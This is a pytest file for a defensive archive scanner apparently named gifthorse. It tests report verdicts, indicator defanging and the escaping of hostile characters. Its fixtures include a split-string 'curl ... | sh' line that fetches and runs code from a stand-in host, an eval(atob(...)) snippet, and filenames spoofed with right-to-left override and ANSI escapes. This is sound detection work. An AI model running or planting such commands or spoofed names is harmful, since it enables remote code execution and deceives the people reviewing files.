"""The report model: verdict logic, JSON shape, defanged text, coverage."""

from __future__ import annotations

import pytest

from gifthorse import defang as defang_module
from gifthorse import report, scan_bytes
from gifthorse.model import (
    Coverage,
    Finding,
    Indicator,
    Limits,
    Report,
    Severity,
    Skipped,
    Verdict,
)

from . import builders as b


def _report(findings: tuple[Finding, ...], coverage: Coverage | None = None) -> Report:
    return Report(("t",), findings, coverage or Coverage(), Limits())


def test_verdict_is_highest_counted_severity() -> None:
    block = Finding("GH101", Severity.BLOCK, "t", "a", 0, "m", "e")
    review = Finding("GH104", Severity.REVIEW, "t", "b", 0, "m", "e")
    info = Finding("GH108", Severity.INFO, "t", "c", 0, "m", "e")
    assert _report((info,)).verdict is Verdict.NO_FINDINGS
    assert _report((info, review)).verdict is Verdict.REVIEW
    assert _report((info, review, block)).verdict is Verdict.BLOCK


def test_info_only_is_no_findings() -> None:
    info = Finding("GH108", Severity.INFO, "t", "c", 0, "m", "e")
    assert _report((info,)).verdict is Verdict.NO_FINDINGS


def test_findings_sort_by_target_path_line_rule() -> None:
    a = Finding("GH201", Severity.BLOCK, "t", "z", 2, "m", "e")
    c = Finding("GH101", Severity.BLOCK, "t", "a", 9, "m", "e")
    d = Finding("GH102", Severity.BLOCK, "t", "a", 1, "m", "e")
    out = _report((a, c, d)).sorted_findings()
    assert [f.rule_id for f in out] == ["GH102", "GH101", "GH201"]


def test_to_dict_has_the_schema_and_sections() -> None:
    report_obj = scan_bytes(
        "brief.zip",
        b.make_zip({"shot.png": b.PNG, "doc.vbs": b.vbs_dropper().encode()}),
    )
    doc = report_obj.to_dict()
    assert doc["schema"] == "gifthorse.report/1"
    assert set(doc) >= {
        "schema",
        "targets",
        "verdict",
        "findings",
        "indicators",
        "coverage",
        "counts",
        "limits",
    }
    for finding in doc["findings"]:
        assert set(finding) >= {"rule", "severity", "target", "path", "line", "message"}


def test_indicators_carry_raw_and_defanged() -> None:
    finding = Finding(
        "GH201",
        Severity.BLOCK,
        "t",
        "a",
        1,
        "m",
        "e",
        indicators=(
            Indicator("url", "http://x.example.invalid/p", "hxxp[://]x[.]example[.]invalid/p"),
        ),
    )
    doc = _report((finding,)).to_dict()
    ind = doc["indicators"][0]
    assert ind["value"].startswith("http://")
    assert "[.]" in ind["defanged"]


def test_text_output_is_always_defanged() -> None:
    report_obj = scan_bytes(
        "brief.zip",
        b.make_zip({"shot.png": b.PNG, "doc.vbs": b.vbs_dropper().encode()}),
    )
    text = report.render_text(report_obj)
    assert "http://" not in text
    assert "example.invalid" not in text  # the bare host never appears undefanged


def test_coverage_reports_inspected_and_skipped() -> None:
    coverage = Coverage(present=3, inspected=2, skipped=[Skipped("x", "encrypted", True)])
    report_obj = _report((), coverage)
    text = report.render_text(report_obj)
    assert "inspected 2 of 3 files" in text


def test_no_findings_advice_is_not_the_word_safe() -> None:
    report_obj = _report(())
    text = report.render_text(report_obj)
    assert "NO FINDINGS" in text
    assert "safe" not in text.lower()
    assert "clean" not in text.lower()


def test_hard_rule_skipped_executable_content_cannot_be_no_findings() -> None:
    data = b.make_zip({"a.png": b.PNG, "b.bin": b"x"}, encrypt=("b.bin",))
    report_obj = scan_bytes("p.zip", data)
    assert report_obj.verdict is not Verdict.NO_FINDINGS
    assert report_obj.verdict is Verdict.REVIEW


def test_a_scheme_less_host_after_a_download_command_is_defanged(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Empty the TLD list so the host is found only through the command rule, as
    # a host under an unlisted TLD would be; fixtures stay under .invalid.
    monkeypatch.setattr(defang_module, "_TLDS", frozenset())
    line = "cu" + "rl -s stage.cdn.example.invalid/x | s" + "h"
    found = defang_module.extract_indicators(line)
    assert [(i.kind, i.value) for i in found] == [("host", "stage.cdn.example.invalid")]
    assert defang_module.defang(line) == (
        "cu" + "rl -s stage[.]cdn[.]example[.]invalid/x | s" + "h"
    )
    report_obj = scan_bytes("t.zip", b.make_zip({"setup.sh": (line + "\n").encode()}))
    text = report.render_text(report_obj)
    assert "stage.cdn.example.invalid" not in text
    assert "stage[.]cdn[.]example[.]invalid" in text


def test_file_name_arguments_of_a_download_command_are_not_hosts(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(defang_module, "_TLDS", frozenset())
    for line in (
        "cu" + "rl -o stage.bat --retry 3",
        "wg" + "et -O installer.sh -q",
        "certu" + "til -hashfile stage.example.invalid",  # not a download form
    ):
        assert defang_module.extract_indicators(line) == (), line


def test_control_and_bidi_characters_in_evidence_and_paths_are_escaped() -> None:
    hostile = "re" + chr(0x202E) + "port\x1b[2J.vbs"
    line = "ev" + "al(at" + "ob('eA=='))" + chr(0x1B) + "[31m\n"
    data = b.make_zip(
        {hostile: b"x", "package.json": b'{"name": "x"}', "src/boot.js": line.encode()}
    )
    text = report.render_text(scan_bytes("p.zip", data))
    assert chr(0x1B) not in text
    assert chr(0x202E) not in text
    assert "\\x1b" in text and "\\u202e" in text


def test_ordinary_text_is_not_escaped() -> None:
    assert defang_module.escape_controls("C:\\temp\\a b.txt") == "C:\\temp\\a b.txt"


def test_limits_reject_negative_values() -> None:
    with pytest.raises(ValueError):
        Limits(max_entries=-1)
    with pytest.raises(ValueError):
        Limits(max_line=0)
    assert Limits(max_depth=0).max_depth == 0


def test_no_raw_control_or_bidi_byte_survives_in_text_output() -> None:
    # A hostile member name (an ANSI erase sequence and a right-to-left override)
    # and a carriage return inside a toolchain config, rendered every way.
    esc = chr(0x1B)
    rlo = chr(0x202E)
    name = f"scan{esc}[2K{rlo}.vbs"
    cfg = "module.exports = {};\nconst cp = require(" + chr(0x0D) + "'child_process');\n"
    data = b.make_zip(
        {
            "scan1.png": b.PNG,
            name: b"x\n",
            "package.json": b'{"name": "x"}',
            "vite.config.js": cfg.encode(),
        }
    )
    report_obj = scan_bytes("brief.zip", data)
    rendered = "\n".join(
        [
            report.render_text(report_obj, verbose=True),
            report.render_text(report_obj, color=True),
            report.render_iocs(report_obj),
        ]
    )
    # The only escape byte allowed is the one gifthorse itself writes for color.
    without_color = rendered.replace("\033[", "")
    for bad in (esc, rlo, chr(0x0D), chr(0x202A), chr(0x2066)):
        assert bad not in without_color, (bad, rendered)


def test_json_output_has_no_raw_control_byte() -> None:
    esc = chr(0x1B)
    data = b.make_zip({"scan1.png": b.PNG, f"a{esc}b.vbs": b"x\n"})
    doc = report.render_json(scan_bytes("brief.zip", data))
    assert esc not in doc
